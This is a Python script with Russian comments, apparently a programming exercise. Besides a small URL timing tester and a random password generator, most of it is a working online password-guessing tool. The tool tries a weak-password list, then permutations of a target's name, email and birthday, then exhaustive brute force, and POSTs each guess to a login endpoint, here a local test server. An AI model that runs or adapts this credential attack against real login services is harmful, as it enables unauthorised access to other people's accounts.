# use Python 3.8
import random
from typing import Text, Iterator
import time
import itertools
import requests


BAD_PASSWORD_FILE = './test.txt'
URLS = ['https://www.avito.ru/',
        'https://www.speedtest.net/',
        'https://djbook.ru/',
        'http://styxcosmetic.ru/',
        'https://www.simplifiedpython.net/',
        'https://ling47.ru/',
        ]

USER_DATA = {'test': {'user_name': 'Иванов Иван Иванович',
                      'user_email': 'test@yandex.ru',
                      'user_birthday': '01/02/1975',
                      },
             }


def test_url(what_url: Text, count: int = 10, sleep_time: int = 1) -> float:
    """
    выполнит http get запрос по  адресу если код не 200 сгенирит ошибку
    если все хорошо - подсчитает время выполнения запросов
    :param what_url: url запроса
    :param count: кол-во повторов
    :param sleep_time: задержка между повторами
    :return:
    """
    begin_time = time.monotonic()
    print(f'\nbegin test {what_url} :')
    for i in range(count):
        response = requests.get(url=what_url)
        print('.', end='')
        if response.status_code != 200:
            raise ConnectionError(f'{what_url} -> Bad response code {response.status_code} in {i} iteration ')

        time.sleep(sleep_time)

    return time.monotonic() - begin_time


def get_alphabet():
    """Вернет состоящий из цифр и прописных символов англ. алфавита"""
    let = ''.join([chr(i) for i in range(97, 97 + 26)])
    numbers = '0123456789'
    alphabet = numbers + let
    return alphabet


def translated(source: str):
    """Транслитерация руссуих букв"""
    source = source.lower()
    rus = list('абвгдеёжзийклмнопрстуфхцчшщъыьэюя')
    lat = list('abvgdeejziiklmnoprctufhtcssmyteyy')
    result = ''
    for ch in source:
        if ch in rus:
            index = rus.index(ch)
            lat_ch = lat[index]
        else:
            lat_ch = ch
        result += lat_ch
    return result


def rewrite_date(date: Text) -> Text:
    """Удалит из даты разделители"""
    if '.' in date:
        date = date.replace('.', '')
    if '-' in date:
        date = date.replace('-', '')
    if '/' in date:
        date = date.replace('/', '')
    return date


def get_self_user_words(name: Text):
    words = []
    if name in USER_DATA:
        words = USER_DATA[name]['user_name'].split(' ')
        trans_words = []
        for item in words:
            spam = translated(item)
            if spam not in words:
                trans_words.append(spam)
        words = trans_words
        words.append(USER_DATA[name]['user_email'])
        words.append(rewrite_date(USER_DATA[name]['user_birthday']))
        for i in range(1, len(words) + 1):
            for subset in itertools.permutations(words, i):
                result = ''.join(subset)
                yield result

    return words


def get_self_user_alphabet(name):
    """вернет алфавит из символов присутствующих в Имени , Эл.почте и дне рождения пользователя без повторений"""
    result = translated(USER_DATA[name]['user_name'])
    result += USER_DATA[name]['user_email']
    result += USER_DATA[name]['user_birthday']
    result = set(result.replace(' ', '_'))
    return ''.join(list(result))


def encode(number, alphabet):
    """закодирует число на базе алфавита"""
    result = ''
    base = len(alphabet)
    spam = number
    while spam > 0:
        rest = spam % base
        spam = spam // base
        result = alphabet[rest - 1] + result
    return result


def get_bruteforce(alphabet):
    counter = 0
    while True:
        counter += 1
        password = encode(counter, alphabet)
        yield password


def get_good_pass(password_length: int = 8) -> Text:
    """Генирация хорошего пароля"""
    let = ''.join([chr(i) for i in range(97, 97 + 26)])

    let_up = let.upper()
    symbols = ''.join([chr(i) for i in range(33, 64)])
    alpha = let + let_up + symbols
    new_pass = ''

    for _ in range(password_length):
        new_pass += random.choice(alpha)
    return new_pass


def get_bad_passwords(bad_password_file: Text) -> Iterator:
    """Считываем  плохие пароли из файла и отдаем их гениратор"""
    reading_lines = []
    with open(bad_password_file, 'rt', encoding='utf-8') as file:
        reading_lines = file.readlines()

    def wrapper():
        for current in reading_lines:
            yield current.strip()

    return wrapper()


def is_valid(name: Text, password: Text, url: Text) -> bool:
    """Проверка пары имя/пароль на url"""
    data = {
        'login': name,
        'password': password,
    }
    response = requests.post(url=url, json=data)
    if response.status_code == 200:
        return True
    else:
        return False


def search_by_alphabet(name: Text, url: Text, alphabet: Text):
    bust_gen = get_bruteforce(alphabet=alphabet)
    while True:
        password = next(bust_gen)
        if not password:
            # при помощи словаря ничего не нашли
            break
        if is_valid(name, password, url):
            return password
    return None


def search_by_gen(name: Text, url: Text, genirator: Iterator):
    password = '1'
    while password:
        password = next(genirator)
        if not password:
            break
        if is_valid(name, password, url):
            return password
    return None


def hack_password(name, url):
    """Подбор пароля  для name на url"""
    bad_gen = get_bad_passwords(BAD_PASSWORD_FILE)
    print('Ищем по файлу')
    password = search_by_gen(name, url, bad_gen)  # поиск по файлу плохих паролей
    if password:
        return password
    if name in USER_DATA:
        print('Ищем по словам пользователя')
        user_words_gen = get_self_user_words(name)
        password = search_by_gen(name, url, user_words_gen)  # поиск по словам в информации о пользователе
        if password:
            return password
        print('Ищем по словарю пользователя')
        user_alpha = get_self_user_alphabet(name)
        user_alpha_gen = get_bruteforce(user_alpha)
        password = search_by_gen(name, url, user_alpha_gen)  # поиск по алфавиту пользователя
        if password:
            return password
    print('Ищем по большому словарю')
    full_alpha = get_alphabet()
    full_alpha_gen = get_bruteforce(full_alpha)
    password = search_by_gen(name, url, full_alpha_gen)  # поиск по полному алфавиту
    if password:
        return password
    return None


def main():
    user_names = ['admin', 'jack', 'cat', 'test']
    url = 'http://127.0.0.1:5000/auth'
    for name in user_names:
        user_password = hack_password(name, url)
        print(f'for {name} I found {user_password} password')


if __name__ == '__main__':
    main()
